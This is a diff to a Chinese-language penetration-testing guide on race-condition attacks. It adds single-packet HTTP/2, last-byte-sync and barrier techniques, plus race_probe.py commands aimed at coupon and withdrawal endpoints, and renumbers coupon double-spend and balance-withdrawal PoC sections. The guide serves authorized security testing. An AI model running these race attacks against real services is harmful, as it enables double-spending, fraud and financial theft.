@@ -34,11 +34,62 @@ SRC 价值：优惠券 / 余额 / 限购双花 = P1（$500–$5k）；金融场�
     requestEngine.queue(req, gate='race1')
     再 openGate('race1')
 - HTTPie 并发：xargs -P 50
+- VHS 自带：scripts/race_probe.py（barrier / pipeline 末字节同步，cap 50，需 race_testing 授权）
 - 自写 Python：threading + requests
 - Go：goroutine + http.Client
 ```
 
-### 3.2 Burp Turbo Intruder 模板
+### 3.2 现代手法：Single-Packet Race（首选，2023+）
+
+传统 50 线程并发受 TCP/TLS 握手抖动影响，请求到达窗口常超过服务端锁窗口。
+现代竞态利用 **单包/末字节同步** 把全部请求的"最后一字节"合并到一次发送：
+
+**1. HTTP/2 Single-Packet Attack（Burp 2023+）**
+_一条 HTTP/2 连接、N 个 stream，各自扣住请求体最后一字节后统一放行_
+```
+Burp Repeater → 选中多个请求 → "Send group in parallel"（单包并行组）
+Turbo Intruder：engine=Engine.HTTP2，requestsPerConnection=1 时配合 gate
+适用前提：目标支持 HTTP/2；POST 有 body 时效果最好（末字节=body 尾字节）
+```
+
+**2. HTTP/1.1 末字节同步（Last-Byte Sync）**
+_无 HTTP/2 时：keep-alive 连接上先写入 N 个"缺尾字节"的请求，再一次性 flush N 个尾字节_
+```
+VHS 自带工具（stdlib，无需 Burp）：
+  python3 scripts/race_probe.py ./engagement \
+      --url https://target/api/coupon/apply \
+      --method POST --data 'code=SAVE50' \
+      --count 20 --mode pipeline --allow-state-change
+  前提：engagement allowed_methods 同时含 race_testing 与 state_change/POST
+```
+
+**3. 多连接 Barrier 并发（兼容性最好）**
+_N 条 TLS 连接用线程屏障对齐后同时发送_
+```
+python3 scripts/race_probe.py ./engagement \
+    --url https://target/api/withdraw \
+    --method POST --data 'amount=1' \
+    --count 30 --mode barrier --allow-state-change
+```
+
+**4. 多端点对齐（Multi-Endpoint Alignment）**
+_同一锁窗口内需命中"不同"端点的组合竞态_
+```
+例：PATCH /email（改邮箱）与 POST /verify-code（消费旧验证码）必须同窗到达
+做法：两个 request group 在同一毫秒窗放行（Repeater 并行组 / 脚本双 barrier）
+```
+
+**5. 隐式多步序列（Hidden Multicall Sequences）**
+_业务规则是"多请求序列"而非单请求：先探测序列，再把整组作为竞态单元_
+```
+例：addToCart → applyCoupon → checkout 三步中 checkout 校验依赖前两步的缓存读
+把三步打包成一个 gate 组重复 10 轮，观察折扣/库存双花
+```
+
+**判定信号：** 混合结果（部分 200 部分 409/403）或 N 份相同成功响应，
+用 race-results.json 的 distinct_body_hashes / identical_response_count 做证据。
+
+### 3.3 Burp Turbo Intruder 模板
 
 ```python
 def queueRequests(target, wordlists):
@@ -54,7 +105,7 @@ def handleResponse(req, interesting):
     table.add(req)
 ```
 
-### 3.3 经典 PoC：余额提现
+### 3.4 经典 PoC：余额提现
 
 ```python
 import threading, requests
@@ -74,7 +125,7 @@ r = requests.get("https://target/api/balance", ...)
 print(r.json())  # 余额可能变成 -4900 / 多笔成功提现
 ```
 
-### 3.4 经典 PoC：优惠券双花
+### 3.5 经典 PoC：优惠券双花
 
 ```python
 def use_coupon():
@@ -89,7 +140,7 @@ threads = [threading.Thread(target=use_coupon) for _ in range(20)]
 # 服务端：1 张券应该只能用 1 次，但并发可能造 5 个折扣订单
 ```
 
-### 3.5 唯一约束破坏
+### 3.6 唯一约束破坏
 
 ```python
 def register():
